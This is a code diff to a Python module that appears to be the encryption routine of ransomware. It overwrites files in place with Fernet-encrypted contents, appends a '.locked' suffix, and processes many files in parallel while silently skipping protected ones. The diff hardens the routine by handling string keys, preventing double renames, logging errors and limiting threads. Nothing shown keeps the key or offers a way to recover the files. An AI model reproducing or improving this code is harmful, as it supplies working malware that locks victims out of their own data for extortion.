@@ -37,6 +37,8 @@ def gen_key() -> bytes:
 
 
 def get_fernet(key: str | bytes) -> Fernet:
+    if isinstance(key, str):
+        key = key.encode()
     return Fernet(key)
 
 
@@ -50,7 +52,8 @@ def decrypt_bytes(fernet: Fernet, data: bytes) -> bytes:
 
 def write_encrypted(file: Path, data: bytes, suffix: str = ".locked") -> None:
     file.write_bytes(data)
-    file.rename(file.with_name(file.name + suffix))
+    if not file.name.endswith(suffix):
+        file.rename(file.with_name(file.name + suffix))
 
 
 def encrypt_file(fernet: Fernet, file: Path) -> None:
@@ -58,10 +61,10 @@ def encrypt_file(fernet: Fernet, file: Path) -> None:
     encrypted_bytes = encrypt_bytes(fernet, file_bytes)
     try:
         write_encrypted(file, encrypted_bytes)
-    except (PermissionError, FileNotFoundError, IsADirectoryError):
-        print(f"Skipping: {file}")
+    except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
+        print(f"Skipping: {file}: {e}")
 
 
 def encrypt_files(fernet: Fernet, files: list[Path]) -> None:
-    with ThreadPoolExecutor() as executor:
-        executor.map(lambda file: encrypt_file(fernet, file), files)  # type: ignore
+    with ThreadPoolExecutor(max_workers=8) as executor:
+        executor.map(lambda f: encrypt_file(fernet, f), files)  # type: ignore
